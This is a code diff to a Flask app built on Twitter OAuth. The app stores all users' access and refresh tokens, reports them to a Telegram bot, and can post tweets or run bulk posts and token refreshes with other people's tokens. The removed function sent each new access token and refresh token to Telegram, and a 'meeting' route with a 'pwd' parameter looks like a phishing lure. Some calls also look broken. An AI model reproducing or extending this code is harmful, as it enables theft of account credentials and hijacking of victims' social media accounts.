@@ -1,14 +1,14 @@
-from flask import request, session, redirect, url_for, render_template
-import requests
-from config import Config
-from database import store_token, get_all_tokens, get_total_tokens
+from flask import redirect, request, session, render_template, url_for
 from helpers import (
     generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
-    get_twitter_username_and_profile, handle_post_single,
+    get_twitter_username_and_profile, generate_random_string, handle_post_single,
     handle_post_bulk, handle_refresh_single, handle_refresh_bulk
 )
+from database import store_token, get_all_tokens, get_total_tokens
+from config import Config
+from app import app  # Import the initialized app from app.py
 
-# Home route function
+@app.route('/')
 def home():
     code = request.args.get('code')
     state = request.args.get('state')
@@ -71,29 +71,29 @@ def home():
 
     return render_template('home.html')
 
-# Dashboard route
+@app.route('/dashboard')
 def dashboard():
     username = session.get('username', 'User')
     return render_template('dashboard.html', username=username)
 
-# Welcome route
+@app.route('/welcome')
 def welcome():
     username = session.get('username', 'User')
     
     if 'refresh_token' in session:
-        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
+        access_token, refresh_token = handle_refresh_single()
         if access_token and refresh_token:
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
             send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
     return render_template('welcome.html', message=f"Welcome back, @{username}!")
 
-# Logout route
+@app.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for('home'))
 
-# Telegram webhook route
+@app.route('/webhook', methods=['POST'])
 def telegram_webhook():
     update = request.json
     message = update.get('message', {}).get('text', '')
@@ -114,7 +114,7 @@ def telegram_webhook():
         send_message_via_telegram("❌ Unknown command.")
     return '', 200
 
-# Tweet route for posting a tweet with a specified access token
+@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
 def tweet(access_token):
     if request.method == 'POST':
         tweet_text = request.form['tweet_text']
@@ -122,57 +122,3 @@ def tweet(access_token):
         return render_template('tweet_result.html', result=result)
 
     return render_template('tweet_form.html', access_token=access_token)
-
-# Refresh page route
-def refresh_page(refresh_token2):
-    return render_template('refresh.html', refresh_token=refresh_token2)
-
-# Perform refresh route
-def perform_refresh(refresh_token):
-    # Logic to refresh token using refresh_token and notify via Telegram
-    token_url = 'https://api.twitter.com/2/oauth2/token'
-    client_credentials = f"{Config.CLIENT_ID}:{Config.CLIENT_SECRET}"
-    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
-    
-    headers = {
-        'Authorization': f'Basic {auth_header}',
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    data = {
-        'refresh_token': refresh_token,
-        'grant_type': 'refresh_token',
-        'client_id': Config.CLIENT_ID
-    }
-
-    response = requests.post(token_url, headers=headers, data=data)
-    token_response = response.json()
-
-    if response.status_code == 200:
-        new_access_token = token_response.get('access_token')
-        new_refresh_token = token_response.get('refresh_token')
-        username, profile_url = get_twitter_username_and_profile(new_access_token)
-
-        if username:
-            store_token(new_access_token, new_refresh_token, username)
-            send_message_via_telegram(f"New Access Token: {new_access_token}\n"
-                                      f"New Refresh Token: {new_refresh_token}\n"
-                                      f"Username: @{username}\n"
-                                      f"Profile URL: {profile_url}")
-            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
-        else:
-            return "Error retrieving user info with the new access token", 400
-    else:
-        error_description = token_response.get('error_description', 'Unknown error')
-        error_code = token_response.get('error', 'No error code')
-        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
-
-# Meeting route
-def meeting():
-    state_id = request.args.get('meeting')
-    code_ch = request.args.get('pwd')
-    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
-
-# Active route
-def active():
-    username = session.get('username', 'User')
-    return render_template('active.html', username=username)
